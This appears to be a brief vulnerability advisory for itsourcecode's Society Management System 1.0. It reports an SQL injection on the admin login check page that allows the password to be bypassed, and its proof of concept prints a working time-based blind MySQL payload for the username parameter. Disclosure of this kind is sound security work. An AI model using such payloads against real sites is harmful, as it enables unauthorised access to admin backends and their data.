# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description
There is an SQL injection vulnerability on the /admin/check_admin.php page, allowing attackers to bypass the password and directly access the website's backend using a universal password. 
<img width="1089" alt="image" src="https://github.com/user-attachments/assets/565ca28b-f65e-4f5e-bd8c-cfde93a04bcc">


# Poc
```
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9121 FROM (SELECT(SLEEP(5)))lIaJ) AND 'oHbk'='oHbk&password=ad
```
